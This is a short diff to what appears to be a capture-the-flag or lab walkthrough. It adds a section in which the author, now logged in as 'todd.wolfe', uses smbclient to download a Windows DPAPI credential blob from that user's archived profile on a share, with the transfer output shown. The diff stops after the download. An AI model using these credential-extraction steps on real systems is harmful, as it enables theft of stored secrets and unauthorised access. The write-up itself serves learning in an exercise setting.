@@ -391,3 +391,9 @@ PS C:\Windows\system32>
 Now i have access as `todd.wolfe`
 
 # Extracting DPAPI credentials
+```python
+smb: \Second-Line Support\Archived Users\todd.wolfe\> get "AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
+getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3 of size 398 as 772275FAD58525253490A9B0039791D3 (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
+
+
+```
